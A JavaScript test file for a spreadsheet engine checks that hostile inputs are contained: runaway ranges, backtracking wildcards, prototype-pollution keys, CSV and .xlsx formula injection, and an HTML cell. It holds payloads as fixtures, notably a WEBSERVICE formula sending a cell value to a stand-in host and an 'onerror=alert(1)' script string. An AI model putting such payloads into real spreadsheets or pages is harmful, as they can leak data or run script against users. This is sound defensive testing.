// Hostile input: what a saved page, a pushed batch, another person's edit or a typed cell can hold, and what
// the downloads and sheet.js do with it. Loaded by tests/run.js.
"use strict";
const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");

module.exports = function ({ E, test, script, within, ROOT }) {
  const SHEET_JS = path.join(ROOT, "sheets/assets/sheet.js"), S = require(SHEET_JS);
  const errOf = (v) => (v && v.e) || null;

  // --- one check for every address and range, and a budget for the work a formula can make ---
  test("a range at row 2^53 is #REF! at once, not a hang (a saved page, a batch, a typed cell)", () => {
    const f = "=SUM(A9007199254740992:A9007199254740992)";
    const v = within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: f } }] }).value("T", "A1"));
    assert.strictEqual(errOf(v), "#REF!");
    const d = { tabs: [{ name: "T", cells: {} }] };
    assert.strictEqual(E.applyDelta(d, JSON.stringify({ tab: "T", cells: { A1: f } })).ok, true); // a formula is data
    assert.strictEqual(errOf(within(2000, () => new E.Book(d).value("T", "A1"))), "#REF!");
    const typed = within(2000, () => new E.Book(d, { t: { B2: { v: f, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } }).value("T", "B2"));
    assert.strictEqual(errOf(typed), "#REF!");
  });
  test("a batch with a cell off the sheet is refused whole", () => {
    for (const a of ["ZZZ9999999", "A10001", "ALM1", "A9007199254740992"]) {
      const d = { tabs: [{ name: "T", cells: {} }] }, r = E.applyDelta(d, JSON.stringify({ tab: "T", cells: { A1: 1, [a]: 1 } }));
      assert.strictEqual(r.ok, false, a);
      assert.match(r.why, /isn't a cell on the sheet/);
      assert.deepStrictEqual(JSON.parse(JSON.stringify(d.tabs[0].cells)), {});
    }
  });
  test("a cell off the sheet, from a saved page or a person's edit, isn't kept, and the grid drawn stays bounded", () => {
    const b = within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: "x", ZZZ9999999: "far" } }] },
      { t: { ZZZ9999999: { v: 1, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } }));
    assert.deepStrictEqual(Object.keys(b.raw.t), ["A1"]);
    assert.deepStrictEqual(JSON.parse(JSON.stringify(E.drawSize(b, b.tabs.t))), { rows: 12, cols: 4, cut: 0 });
    // The far corner a person may still reach: drawn only up to the cap on cells, and the page says so.
    const corner = E.colName(E.LIMIT.cols) + E.LIMIT.rows;
    const c = new E.Book({ tabs: [{ name: "T", cells: { A1: "x" } }] }, { t: { [corner]: { v: 1, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } });
    const ds = E.drawSize(c, c.tabs.t);
    assert.ok(ds.rows * ds.cols <= E.LIMIT.cells, JSON.stringify(ds));
    assert.ok(ds.cut > 0);
    const ui = script("sheet-ui");
    assert.match(ui, /E\.drawSize\(book, tab\)/);
  });
  test("a formula that would read millions of cells ends in #CALC!, not a hang", () => {
    const cells = { A1: 1 };
    for (let r = 1; r <= 40; r++) cells["B" + r] = "=SUMPRODUCT((A1:T10000=1)*(A1:T10000=1))";
    const t0 = Date.now();
    const vals = within(20000, () => { const b = new E.Book({ tabs: [{ name: "T", cells }] }); return Object.keys(cells).map((a) => b.value("T", a)); });
    assert.ok(vals.some((v) => errOf(v) === "#CALC!"), "no cell ran out of budget");
    assert.ok(Date.now() - t0 < 6000, `took ${Date.now() - t0} ms`);
    assert.strictEqual(vals[0], 1);
  });
  test("text past Excel's 32,767 characters is #VALUE!, so cells doubling each other end", () => {
    const cells = { A1: "xx" };
    for (let r = 2; r <= 24; r++) cells["A" + r] = `=A${r - 1}&A${r - 1}`;
    const b = new E.Book({ tabs: [{ name: "T", cells }] });
    const last = within(5000, () => b.value("T", "A24"));
    assert.strictEqual(errOf(last), "#VALUE!");
    assert.strictEqual(b.value("T", "A14").length, 16384);
    assert.strictEqual(errOf(within(2000, () => new E.Book({ tabs: [{ name: "T", cells: Object.assign({}, cells, { B1: "=CONCAT(A14,A14,A14)" }) }] }).value("T", "B1"))), "#VALUE!");
  });

  test("a wildcard criterion can't backtrack without end, and its work is charged to the budget", () => {
    const crit = "*a".repeat(28) + "b";
    assert.strictEqual(within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: "a".repeat(40), B1: `=COUNTIF(A1,"${crit}")` } }] }).value("T", "B1")), 0);
    const cells = {};
    for (let r = 1; r <= 200; r++) cells["A" + r] = "a".repeat(2000);
    for (let r = 1; r <= 50; r++) cells["B" + r] = `=COUNTIF(A1:A200,"${"*a".repeat(20)}*b")`;
    const t0 = Date.now();
    const vals = within(10000, () => { const b = new E.Book({ tabs: [{ name: "T", cells }] }); return Object.keys(cells).filter((a) => a[0] === "B").map((a) => b.value("T", a)); });
    assert.strictEqual(vals[0], 0);
    assert.ok(vals.some((v) => errOf(v) === "#CALC!"), "the matching wasn't charged");
    assert.ok(Date.now() - t0 < 4000, `took ${Date.now() - t0} ms`);
    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B1: '=COUNTIF(A1:A3,"bike*")', B2: '=COUNTIF(A1:A3,"?ike")', B3: '=COUNTIF(A1:A3,"*s*")' } }] }).value("T", "B1"), 2);
    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B2: '=COUNTIF(A1:A3,"?ike")' } }] }).value("T", "B2"), 1);
    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B3: '=COUNTIF(A1:A3,"*s*")' } }] }).value("T", "B3"), 2);
  });
  test("element-wise arrays are capped before they're made, and every pass over one is charged", () => {
    const t0 = Date.now();
    const one = (f) => within(3000, () => new E.Book({ tabs: [{ name: "T", cells: { Z1: f } }] }).value("T", "Z1"));
    assert.strictEqual(errOf(one("=SUMPRODUCT((A1:A2000=1)*(A1:GR1=1))")), "#CALC!"); // 2,000 x 200 = 400,000 cells
    assert.strictEqual(errOf(one("=SUMPRODUCT((A1:A10000=1)*(A1:ALL1=1))")), "#CALC!"); // 10 million
    const passes = Math.ceil(E.LIMIT.steps / 200000) + 1; // enough passes of 200,000 cells to spend the budget
    assert.strictEqual(errOf(one("=SUM(" + "-(".repeat(passes) + "A1:T10000" + ")".repeat(passes + 1))), "#CALC!");
    assert.strictEqual(errOf(one("=SUMPRODUCT(" + Array(passes).fill("A1:T10000").join(",") + ")")), "#CALC!");
    assert.strictEqual(one("=SUMPRODUCT((A1:A20=0)*(A1:T1=0))"), 400); // a small one still works
    assert.ok(Date.now() - t0 < 4000, `took ${Date.now() - t0} ms`);
  });
  // --- a person's record ---
  test("a malformed edit in a person's record is skipped; the good ones still count", () => {
    const edits = {
      "Budget!A1": null, "Budget!A2": "text", "Budget!A3": { v: { x: 1 }, at: "2026-11-14T10:00:00Z" }, "Budget!A4": { v: 1 },
      "Budget!A5": { v: 1, at: "not a time" }, "Budget!ZZZ9999999": { v: 1, at: "2026-11-14T10:00:00Z" }, "A6": { v: 1, at: "2026-11-14T10:00:00Z" },
      "Budget!a7": { v: 1, at: "2026-11-14T10:00:00Z" }, "Budget!B2": { v: 120, at: "2026-11-14T10:00:00Z" },
    };
    const ok = JSON.parse(JSON.stringify(E.cleanEdits(edits)));
    assert.deepStrictEqual(ok, [{ tab: "budget", a: "B2", v: 120, at: "2026-11-14T10:00:00Z", t: Date.parse("2026-11-14T10:00:00Z") }]);
    for (const bad of [null, "edits", [1, 2], 5]) assert.deepStrictEqual(JSON.parse(JSON.stringify(E.cleanEdits(bad))), []);
    const ui = script("sheet-ui");
    assert.match(script("sheet-engine"), /cleanEdits\(rec\.data && rec\.data\.edits\)/); // mergeEdits, which the page's overlay uses
    // When loading fails, the sheet as saved is drawn: no one's records, so a bad one can't be drawn again.
    assert.match(ui, /\.catch\(function \(e\) \{[^}]*state\.others = \[\]; state\.me = null;/);
  });

  test("a person's edit to a tab that isn't there, __proto__ included, reaches nothing", () => {
    const at = "2026-11-14T10:00:00Z", tabs = [{ name: "Budget", cells: { A1: "Item" } }];
    const recs = [{ data: { edits: JSON.parse(`{"__proto__!B1": {"v": 777, "at": "${at}"}, "constructor!B1": {"v": 1, "at": "${at}"}, "Nope!B1": {"v": 2, "at": "${at}"}, "Budget!B2": {"v": 5, "at": "${at}"}}`) }, author_name: "Sam" }];
    const ov = E.mergeEdits(recs, tabs, () => 0);
    assert.strictEqual(({}).B1, undefined);
    assert.strictEqual(Object.getPrototypeOf(E.Book.prototype).B1, undefined); // the engine's own realm too
    assert.deepStrictEqual(Object.keys(ov), ["budget"]);
    assert.deepStrictEqual(JSON.parse(JSON.stringify(ov.budget.B2)), { v: 5, at, t: Date.parse(at), peer: true, by: "Sam" });
    const b = new E.Book({ tabs }, ov);
    assert.strictEqual(b.value("Budget", "B1"), null);
    assert.strictEqual(errOf(b.value("Budget", "C1") || new E.Book({ tabs: [{ name: "Budget", cells: { C1: "=constructor!A1+toString!A1" } }] }).value("Budget", "C1")), "#REF!");
    assert.match(script("sheet-ui"), /E\.mergeEdits\(/);
  });
  test("a link with a broken #tab= still opens the sheet", () => {
    const ui = script("sheet-ui"), line = ui.split("\n").find((l) => l.includes("location.hash"));
    assert.match(line, /try \{[^}]*decodeURIComponent[^}]*\} catch/, line);
  });
  // --- downloads ---
  function parseCsv(text) { // RFC 4180: quoted fields, "" inside them
    const rows = [[]]; let f = "", q = false;
    for (let i = 0; i < text.length; i++) {
      const ch = text[i];
      if (q) { if (ch === '"' && text[i + 1] === '"') { f += '"'; i++; } else if (ch === '"') q = false; else f += ch; }
      else if (ch === '"') q = true;
      else if (ch === ",") { rows[rows.length - 1].push(f); f = ""; }
      else if (ch === "\r" && text[i + 1] === "\n") { rows[rows.length - 1].push(f); f = ""; rows.push([]); i++; }
      else f += ch;
    }
    rows.pop();
    return rows;
  }
  const unzipText = (bytes) => Buffer.from(bytes).toString("utf8"); // a stored zip: the parts are plain text
  function exportBook() {
    const data = { title: "T", currency: "GBP", locale: "en-GB", tabs: [{ name: "Budget", cells: {
      B1: 10, B2: 20, C1: "=SUM(B1:B2)", C2: "=WEBSERVICE(\"https://example.invalid/?value=\"&B1)", C3: "='http://x.invalid/[a.xlsx]S'!A1",
      C4: "=FILTERXML(B1,\"x\")", D1: "@SUM(1+1)", D2: "-5 apples", D3: -5, D4: "+44 20 7946 0000", D5: "=\"=1+1\"" } }] };
    const ov = { budget: {
      E1: { v: "=SUM(B1:B2)", at: "2026-11-14T10:00:00Z", by: "Sam", peer: true },
      E2: { v: "=WEBSERVICE(\"https://example.invalid/?v=\"&B1)", at: "2026-11-14T10:00:00Z", by: "Sam", peer: true },
      E3: { v: "=B1*2", at: "2026-11-14T10:00:00Z", by: "You" } } };
    return new E.Book(data, ov);
  }
  test(".xlsx: only the sheet's own formulas with the engine's functions go live; the rest is text Excel won't run", () => {
    const xml = unzipText(E.xlsx(exportBook()));
    const f = [...xml.matchAll(/<c r="([A-Z]+\d+)"[^>]*><f>([^<]*)<\/f>/g)].map((m) => m[1] + " " + m[2]);
    assert.deepStrictEqual(f.sort(), ["C1 SUM(B1:B2)", "D5 &quot;=1+1&quot;", "E3 B1*2"]);
    assert.ok(!/WEBSERVICE[^<]*<\/f>|FILTERXML[^<]*<\/f>|\[a\.xlsx\][^<]*<\/f>/.test(xml));
    for (const [a, text] of [["C2", '=WEBSERVICE("https://example.invalid/?value="&amp;B1)'], ["E1", "=SUM(B1:B2)"], ["C4", '=FILTERXML(B1,"x")']]) {
      const m = new RegExp(`<c r="${a}" s="(\\d+)" t="inlineStr"><is><t xml:space="preserve">([^<]*)</t>`).exec(xml);
      assert.ok(m, `${a} isn't text`);
      assert.strictEqual(m[2].replace(/&quot;/g, '"'), text);
      const xf = [...xml.matchAll(/<cellXfs[^>]*>([\s\S]*?)<\/cellXfs>/g)][0][1].match(/<xf [^>]*\/>/g)[+m[1]];
      assert.match(xf, /quotePrefix="1"/, `${a}'s style keeps it text when someone edits it in Excel`);
    }
    assert.match(xml, /<c r="D1" s="\d+" t="inlineStr"><is><t xml:space="preserve">@SUM\(1\+1\)<\/t>/);
  });
  test("CSV of a tab with someone's edit at the far corner stays within the cap on cells", () => {
    const corner = E.colName(E.LIMIT.cols) + E.LIMIT.rows;
    const b = new E.Book({ tabs: [{ name: "T", cells: { A1: "x" } }] }, { t: { [corner]: { v: 1, at: "2026-11-14T10:00:00Z", by: "Sam", peer: true } } });
    const lines = within(3000, () => E.csv(b, "T")).trim().split("\r\n");
    assert.ok(lines.length * E.LIMIT.cols <= E.LIMIT.cells, String(lines.length));
    assert.match(script("sheet-ui"), /drawn and in the CSV; the \.xlsx holds them all/);
  });
  test("CSV: text starting with = + - or @ gets a leading apostrophe; numbers don't", () => {
    const rows = parseCsv(E.csv(exportBook(), "Budget"));
    assert.strictEqual(rows[0][3], "'@SUM(1+1)");
    assert.strictEqual(rows[1][3], "'-5 apples");
    assert.strictEqual(rows[2][3], "-5");
    assert.strictEqual(rows[3][3], "'+44 20 7946 0000");
    assert.strictEqual(rows[4][3], "'=1+1");
    assert.strictEqual(rows[0][2], "30");
    // A formula the engine doesn't run, or another person's, goes in as its text, after an apostrophe.
    assert.strictEqual(rows[1][2], `'=WEBSERVICE("https://example.invalid/?value="&B1)`);
    assert.strictEqual(rows[3][2], `'=FILTERXML(B1,"x")`);
    assert.strictEqual(rows[0][4], "'=SUM(B1:B2)");
    assert.strictEqual(rows[2][4], "20"); // your own formula: its value, as for the sheet's
  });

  // --- property: random formulas and records, each case under a time limit ---
  test("property: 2,000 random sheets of formulas and people's records each finish in 3 s, with plain values and no prototype touched", () => {
    let seed = 20261114;
    const rnd = () => { seed = (seed + 0x6D2B79F5) | 0; let t = Math.imul(seed ^ (seed >>> 15), 1 | seed); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
    const pick = (a) => a[Math.floor(rnd() * a.length)];
    const REFS = ["A1", "B2", "$C$3", "C$4", "Z9", "A10000", "A10001", "ALL1", "ALM1", "A9007199254740992", "XFD1048576", "A0", "A:A", "B:C",
      "A1:B5", "A1:ALL10000", "A1:A200", "'Q1 plan'!A1:B3", "Budget!A1:A5", "__proto__!A1", "constructor!B2", "toString!A1:A3", "'x]'!A1", "Nope!A1"];
    const FNS = [...E.NAMES, "WEBSERVICE", "INDIRECT", "HYPERLINK", "constructor", "__proto__", "toString", "valueOf", "hasOwnProperty", "_xlfn.CONCAT"];
    const STR = ['"*a*a*a*a*a*a*a*a*a*a*b"', '"?"', '"<>"', '">=5"', '"=1+1"', '"@cmd"', '"' + "x".repeat(300) + '"', '""', '"a""b"', '"<script>"', '"__proto__"', '"a*"', '"*"'];
    const NUM = ["0", "1", "-1", "1e308", "1e-308", "9007199254740993", "3.5", "100%"];
    const JUNK = ['"', "(", ")", "!", ":", "$", "'", "A", "1", ",", "*", "[", "|", "#", "&", "~", "\\", "=", ";"];
    function expr(d) {
      const k = d > 3 ? rnd() * 3 : rnd() * 7.3;
      if (k < 1) return rnd() < 0.03 ? pick(["A1:T10000", "A1:A2000", "A1:GR1", "A1:A10000", "A1:ALL1"]) : pick(REFS);
      if (k < 2) return pick(NUM);
      if (k < 3) return pick(STR);
      if (k < 4) return pick(FNS) + "(" + Array.from({ length: Math.floor(rnd() * 4) }, () => expr(d + 1)).join(",") + ")";
      if (k < 5) return expr(d + 1) + pick(["+", "-", "*", "/", "^", "&", "=", "<>", "<", ">="]) + expr(d + 1);
      if (k < 6) return pick(["-", "+", "("]) + expr(d + 1) + (rnd() < 0.5 ? ")" : "%");
      if (k < 7) return "(".repeat(1 + Math.floor(rnd() * 3)) + expr(d + 1) + ")".repeat(Math.floor(rnd() * 4));
      if (k < 7.1) return "-(".repeat(4) + pick(["A1:A2000", "A1:GR1"]) + ")".repeat(4) + pick(["*", "+", "="]) + pick(["A1:A2000", "A1:GR1", "A1:ALL1"]);
      return Array.from({ length: 1 + Math.floor(rnd() * 12) }, () => pick(JUNK)).join("");
    }
    const at = () => pick(["2026-11-14T10:00:00Z", "2099-01-01T00:00:00Z", "bad", "", 5, null]);
    const KEYS = ["Budget!B3", "budget!C4", "__proto__!B1", "constructor!A1", "Nope!A1", "Budget!ZZZ1", "Budget!a7", "Budget!A0", "!A1", "Budget!", "Q1 plan!B2", "'Q1 plan'!B2", "Budget!B9", "hasOwnProperty!A1"];
    const edit = () => pick([null, 1, "x", [1], { v: "=" + expr(0), at: at() }, { v: pick([5, "t", true, null, 1e308]), at: at() }, { v: { x: 1 }, at: at() }, { v: [1], at: at() }, { at: at() }]);
    const record = () => pick([null, "junk", { data: "junk" }, { data: { edits: [1, 2] } },
      { mine: rnd() < 0.3, author_name: pick(["Sam", "<b>x</b>", undefined]), data: { edits: Object.fromEntries(Array.from({ length: 1 + Math.floor(rnd() * 5) }, () => [pick(KEYS), edit()])) } }]);
    const realmProto = Object.getPrototypeOf(E.Book.prototype), before = Object.getOwnPropertyNames(realmProto).join(), mainBefore = Object.getOwnPropertyNames(Object.prototype).join();
    const plain = (v) => v === null || typeof v === "string" || typeof v === "boolean" || (typeof v === "number" && isFinite(v)) || (E.isErr(v) && Object.keys(v).length === 1);
    let slowest = 0, slowCase = -1;
    for (let n = 0; n < 2000; n++) {
      const t0 = Date.now();
      const bad = within(3000, () => {
        const cells = { A1: "a".repeat(2000), A2: 3, A3: "2026-11-01", A4: true, A5: "=1+1" };
        for (let r = 1; r <= 8; r++) cells["B" + r] = "=" + expr(0);
        if (rnd() < 0.2) cells[pick(["ZZZ9999999", "__proto__", "constructor", "a1", "A0"])] = "=" + expr(0);
        const tabs = [{ name: "Budget", freeze: 1, cols: [{ w: 100, fmt: pick(["money", "constructor", "__proto__", "month"]) }], cells,
          lists: [{ range: pick(REFS), values: ["a", "b"] }], checks: [pick(REFS)], rules: [{ range: pick(REFS), if: "=" + expr(0), style: pick(["bad", "constructor", "__proto__"]) }],
          charts: [{ type: "bar", labels: pick(REFS), series: [{ name: "s", range: pick(REFS) }] }] }, { name: "Q1 plan", cells: { A1: 1, B2: "=" + expr(0) } }];
        const ov = E.mergeEdits(Array.from({ length: Math.floor(rnd() * 4) }, record), tabs, () => 0);
        const b = new E.Book({ currency: pick(["GBP", "constructor", "__proto__"]), locale: "en-GB", tabs }, ov);
        E.report(b); E.xlsx(b); E.csv(b, "Budget"); E.drawSize(b, b.tabs.budget);
        for (const t of ["Budget", "Q1 plan"]) for (const a of Object.keys(b.raw[t.toLowerCase()])) { const v = b.value(t, a); if (!plain(v)) return `${t}!${a} = ${String(v)} from ${JSON.stringify(b.raw[t.toLowerCase()][a])}`; }
        E.applyDelta({ tabs: [{ name: "Budget", cells: {} }] }, JSON.stringify({ tab: "Budget", cells: { [pick(KEYS).split("!")[1] || "A1"]: "=" + expr(0) } }));
        return null;
      });
      assert.strictEqual(bad, null, `case ${n}: ${bad}`);
      if (Date.now() - t0 > slowest) { slowest = Date.now() - t0; slowCase = n; }
      assert.strictEqual(Object.getOwnPropertyNames(realmProto).join(), before, `case ${n} touched Object.prototype`);
      assert.strictEqual(Object.getOwnPropertyNames(Object.prototype).join(), mainBefore, `case ${n} touched Object.prototype`);
    }
    console.log(`     slowest case: ${slowest} ms (case ${slowCase})`);
  });

  // --- sheet.js ---
  function folder(failOn) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sheets-test-")), bin = path.join(dir, "bin");
    fs.mkdirSync(bin); fs.mkdirSync(path.join(dir, "w", ".sheet"), { recursive: true });
    // A stand-in for the spacesheep CLI: it refuses the commands named in failOn, and answers the rest.
    fs.writeFileSync(path.join(bin, "spacesheep"), `#!/bin/sh\necho "$*" >> ${dir}/calls.log\ncase " $* " in\n${failOn.map((w) => `  *" ${w} "*) echo "refused: $1" >&2; exit 1;;`).join("\n")}\n  *" spaces get "*) echo "  id: 00000000-0000-4000-8000-000000000000"; exit 0;;\nesac\ncat >> ${dir}/calls.log\necho >> ${dir}/calls.log\necho '{"tabs_open":1}'\n`, { mode: 0o755 });
    fs.writeFileSync(path.join(dir, "w", ".sheet", "space"), "00000000-0000-4000-8000-000000000000");
    fs.writeFileSync(path.join(dir, "w", "data.json"), JSON.stringify({ title: "T", tabs: [{ name: "Budget", freeze: 1, cells: { A1: "Item" } }] }));
    const run = (...args) => spawnSync(process.execPath, [SHEET_JS, "-C", path.join(dir, "w"), ...args], { encoding: "utf8", env: Object.assign({}, process.env, { PATH: `${bin}:${process.env.PATH}` }) });
    return { dir, run, sent: () => fs.existsSync(path.join(dir, "w", ".sheet", "sent.json")), calls: () => fs.readFileSync(path.join(dir, "calls.log"), "utf8") };
  }
  // --- the skill in two parts: start names the sheet; the first push prints the rest ---
  const BUILD = fs.readFileSync(path.join(ROOT, "sheets/references/build.md"), "utf8").split("\n")[0];
  test("start puts the title and the named tabs on screen, and seeds data.json with them", () => {
    const f = folder([]);
    fs.rmSync(path.join(f.dir, "w"), { recursive: true }); fs.mkdirSync(path.join(f.dir, "w"));
    const r = f.run("start", "https://example.invalid/@j/s", "Bike shop budget", "Summary", "Budget", "Transactions");
    assert.strictEqual(r.status, 0, r.stdout + r.stderr);
    assert.match(f.calls(), /<h1 data-ss-id=\\?"title\\?">Bike shop budget<\/h1>/);
    assert.match(f.calls(), /\\"name\\": ?\\"Transactions\\"/);
    const d = JSON.parse(fs.readFileSync(path.join(f.dir, "w", "data.json"), "utf8"));
    assert.deepStrictEqual([d.title, d.tabs.map((t) => t.name)], ["Bike shop budget", ["Summary", "Budget", "Transactions"]]);
    assert.match(r.stdout, /# The sheet's JSON block/); // the format, printed by start
    assert.doesNotMatch(r.stdout, new RegExp(BUILD.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
    const bad = f.run("start", "https://example.invalid/@j/s", "T", "Q1/Q2");
    assert.notStrictEqual(bad.status, 0);
    assert.match(bad.stderr, /tab name/);
  });
  test("the first push prints the rest of the skill; rows before it are refused, with it", () => {
    const f = folder([]);
    const frame = f.run("push", "Writing Budget");
    assert.strictEqual(frame.status, 0, frame.stderr);
    assert.ok(frame.stdout.includes(BUILD), "the first push didn't print build.md");
    const g = folder([]);
    fs.mkdirSync(path.join(g.dir, "w", "cells"));
    fs.writeFileSync(path.join(g.dir, "w", "cells", "01-rows.json"), JSON.stringify({ tab: "Budget", cells: { A2: "Rent" } }));
    const early = g.run("push", "Budget: 1 line in");
    assert.notStrictEqual(early.status, 0);
    assert.ok(early.stdout.includes(BUILD));
    assert.strictEqual(g.sent(), false);
    const again = g.run("push", "Budget: 1 line in");
    assert.strictEqual(again.status, 0, again.stderr);
  });
  test("sheet.js: a page push and a save that both fail exit non-zero and mark nothing sent, so a retry sends it", () => {
    const f = folder(["call", "deploy"]);
    const r = f.run("push", "Writing Budget");
    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
    assert.strictEqual(f.sent(), false);
    assert.doesNotMatch(f.run("push").stdout, /no cell changed/);
  });
  test("sheet.js: a save whose version lands but whose live push fails exits non-zero", () => {
    const f = folder(["call"]);
    const r = f.run("save", "The budget");
    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /saved: The budget/);
    assert.strictEqual(f.sent(), false);
  });
  // A save after a push is changed in place on open tabs only if they already show it, so the save pushes it first.
  const livePages = (f) => f.calls().split("\n").filter((l) => l.startsWith('{"space_id"')).map((l) => JSON.parse(l)).filter((b) => b.html).map((b) => b.html);
  const saved = (f) => fs.readFileSync(path.join(f.dir, "w", ".sheet", "work", "index.html"), "utf8");
  test("sheet.js: a save shows open tabs the very page it saves, whole, before saving it", () => {
    const f = folder([]);
    const first = f.run("push", "Writing Budget");
    assert.strictEqual(first.status, 0, first.stdout + first.stderr);
    assert.deepStrictEqual(livePages(f), [saved(f)]); // the first save stores exactly the page just pushed
    fs.mkdirSync(path.join(f.dir, "w", "cells"));
    fs.writeFileSync(path.join(f.dir, "w", "cells", "01-rows.json"), JSON.stringify({ tab: "Budget", cells: { A2: "Rent", A3: "</pre><img src=x onerror=alert(1)>" } }));
    assert.strictEqual(f.run("push", "Budget: 2 lines in").status, 0); // a batch, not a page
    assert.strictEqual(livePages(f).length, 1);
    const r = f.run("save", "The budget", "Done");
    assert.strictEqual(r.status, 0, r.stdout + r.stderr);
    const pages = livePages(f), lines = f.calls().split("\n");
    assert.strictEqual(pages.length, 2);
    assert.strictEqual(pages[1], saved(f));
    assert.ok(S.pageData(saved(f)).saved_at && S.pageData(saved(f)).tabs[0].cells.A3 === "</pre><img src=x onerror=alert(1)>");
    const pushedAt = lines.findIndex((l) => l.startsWith('{"space_id"') && l.includes(JSON.stringify(pages[1]).slice(1, 200)));
    assert.ok(pushedAt >= 0 && pushedAt < lines.findIndex((l, i) => i > pushedAt && l.startsWith("deploy ")), "the page went live after the save");
    assert.match(r.stdout, /no cell changed since the last push/);
  });
  test("sheet.js: a first save that fails exits non-zero, and the next push saves it", () => {
    const f = folder(["deploy"]);
    const r = f.run("push", "Writing Budget");
    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
    fs.writeFileSync(path.join(f.dir, "bin", "spacesheep"), `#!/bin/sh\ncat >/dev/null\necho '{"tabs_open":1}'\n`);
    const again = f.run("push");
    assert.strictEqual(again.status, 0, again.stdout + again.stderr);
    assert.match(again.stdout, /saved it/);
  });
  test("sheet.js refuses a fill range off the sheet before expanding it", () => {
    assert.throws(() => within(2000, () => S.fill({ "A9007199254740992:A9007199254740992": 1 }, "t")), /off the sheet/);
    assert.throws(() => within(2000, () => S.fill({ "A1:A10001": 1 }, "t")), /off the sheet/);
    assert.strictEqual(Object.keys(S.fill({ "A1:A3": 1 }, "t")).length, 3);
  });
  test("sheet.js refuses a cell off the sheet before sending anything", () => {
    const f = folder([]);
    fs.mkdirSync(path.join(f.dir, "w", "cells"));
    fs.writeFileSync(path.join(f.dir, "w", "cells", "01-x.json"), JSON.stringify({ tab: "Budget", cells: { "A2:A10002": "=1" } }));
    const r = f.run("push");
    assert.notStrictEqual(r.status, 0);
    assert.match(r.stderr, /cells\/01-x\.json: A2:A10002 is off the sheet/);
    assert.strictEqual(f.sent(), false);
  });
  test("sheet.js refuses a drop-down, tick, highlight or chart range off the sheet, which the page would drop", () => {
    const f = folder([]), data = JSON.parse(fs.readFileSync(path.join(f.dir, "w", "data.json"), "utf8"));
    data.tabs[0].lists = [{ range: "B2:B20000", values: ["a", "b"] }];
    fs.writeFileSync(path.join(f.dir, "w", "data.json"), JSON.stringify(data));
    const r = f.run("push");
    assert.notStrictEqual(r.status, 0);
    assert.match(r.stderr, /Budget: the range B2:B20000 runs off the sheet/);
  });
};
